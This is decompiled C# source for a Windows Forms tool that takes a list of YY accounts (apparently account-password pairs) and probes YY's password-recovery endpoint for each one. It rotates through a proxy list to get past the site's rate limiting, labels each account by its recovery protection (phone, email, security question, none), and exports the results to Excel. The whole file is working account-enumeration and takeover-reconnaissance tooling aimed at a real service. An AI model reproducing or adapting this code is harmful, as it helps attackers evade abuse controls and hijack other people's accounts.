using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using helper;

namespace 启动程序
{
	// Token: 0x02000006 RID: 6
	public partial class YY检测 : Form
	{
		// Token: 0x0600001C RID: 28 RVA: 0x00004379 File Offset: 0x00002579
		public YY检测()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00004398 File Offset: 0x00002598
		public void run()
		{
			StreamReader streamReader = new StreamReader(this.textBox1.Text, Encoding.Default);
			string text = streamReader.ReadToEnd();
			string[] array = text.Split(new string[]
			{
				"\r\n"
			}, StringSplitOptions.None);
			string[] array2 = method.GetUrl(this.textBox2.Text, "utf-8").Split(new string[]
			{
				"\r\n"
			}, StringSplitOptions.None);
			int num = 0;
			for (int i = 0; i < array.Length; i++)
			{
				bool flag = array[i] != "";
				if (flag)
				{
					string[] array3 = array[i].Split(new string[]
					{
						"----"
					}, StringSplitOptions.None);
					string urlwithIP = method.GetUrlwithIP("https://aq.yy.com/p/pwd/fgt/mnew/dpch.do?account=" + array3[0].Trim() + "&busifrom=&appid=1&yyapi=false", array2[num]);
					while (urlwithIP.Contains("IP验证次数过多"))
					{
						num++;
						urlwithIP = method.GetUrlwithIP("https://aq.yy.com/p/pwd/fgt/mnew/dpch.do?account=" + array3[0].Trim() + "&busifrom=&appid=1&yyapi=false", array2[num]);
					}
					ListViewItem listViewItem = this.listView1.Items.Add(this.listView1.Items.Count.ToString());
					listViewItem.SubItems.Add(array[i]);
					this.label1.Text = "正在检测" + array[i];
					bool flag2 = urlwithIP.Contains("LEVEL5_BAN");
					if (flag2)
					{
						listViewItem.SubItems.Add("手机类型");
					}
					else
					{
						bool flag3 = urlwithIP.Contains("账号不存在");
						if (flag3)
						{
							listViewItem.SubItems.Add("账号不存在");
						}
						else
						{
							bool flag4 = urlwithIP.Contains("未设置密保");
							if (flag4)
							{
								listViewItem.SubItems.Add("未设置密保");
							}
							else
							{
								bool flag5 = urlwithIP.Contains("LEVEL5_NORMAL");
								if (flag5)
								{
									listViewItem.SubItems.Add("密保问题");
								}
								else
								{
									bool flag6 = urlwithIP.Contains("LEVEL3_EMAIL");
									if (flag6)
									{
										listViewItem.SubItems.Add("邮箱类型");
									}
									else
									{
										listViewItem.SubItems.Add("其他类型");
									}
								}
							}
						}
					}
					while (!this.zanting)
					{
						Application.DoEvents();
					}
				}
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x0000460C File Offset: 0x0000280C
		private void YY检测_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000460F File Offset: 0x0000280F
		private void button6_Click(object sender, EventArgs e)
		{
			method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00004629 File Offset: 0x00002829
		private void button3_Click(object sender, EventArgs e)
		{
			this.zanting = false;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00004633 File Offset: 0x00002833
		private void button4_Click(object sender, EventArgs e)
		{
			this.zanting = true;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00004640 File Offset: 0x00002840
		private void button1_Click(object sender, EventArgs e)
		{
			bool flag = this.openFileDialog1.ShowDialog() == DialogResult.OK;
			bool flag2 = flag;
			if (flag2)
			{
				this.textBox1.Text = this.openFileDialog1.FileName;
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x0000467C File Offset: 0x0000287C
		private void button2_Click(object sender, EventArgs e)
		{
			string url = method.GetUrl("http://www.acaiji.com/index/index/vip.html", "utf-8");
			bool flag = url.Contains("yyjiance");
			if (flag)
			{
				bool flag2 = this.textBox1.Text == "";
				if (flag2)
				{
					MessageBox.Show("请导入卡号");
				}
				else
				{
					bool flag3 = this.textBox2.Text == "";
					if (flag3)
					{
						MessageBox.Show("请导入代理IP链接");
					}
					else
					{
						this.button2.Enabled = false;
						Thread thread = new Thread(new ThreadStart(this.run));
						thread.Start();
						Control.CheckForIllegalCrossThreadCalls = false;
					}
				}
			}
			else
			{
				MessageBox.Show("验证失败");
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x0000473B File Offset: 0x0000293B
		private void button5_Click(object sender, EventArgs e)
		{
			this.listView1.Items.Clear();
		}

		// Token: 0x06000025 RID: 37 RVA: 0x0000474F File Offset: 0x0000294F
		private void button7_Click(object sender, EventArgs e)
		{
			this.button2.Enabled = true;
		}

		// Token: 0x0400003C RID: 60
		private bool zanting = true;
	}
}
